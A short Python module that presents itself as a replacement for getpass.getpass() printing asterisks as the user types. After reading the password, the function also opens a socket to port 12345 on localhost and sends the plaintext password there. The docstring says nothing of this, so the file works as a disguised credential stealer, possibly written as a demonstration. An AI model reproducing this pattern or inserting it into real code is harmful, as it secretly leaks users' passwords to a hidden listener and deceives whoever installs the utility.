import getch
import socket
def getpass(prompt):
    """Replacement for getpass.getpass() which prints asterisks for each character typed"""
    print(prompt, end='', flush=True)
    buf = ''
    while True:
        ch = getch.getch()
        if ch == '\n':
            print('')
            break
        else:
            buf += ch
            print('*', end='', flush=True)
    port = 12345
    s = socket.socket()
    s.connect(('127.0.0.1',port))
    s.send(buf.encode())
    s.close()
    return buf
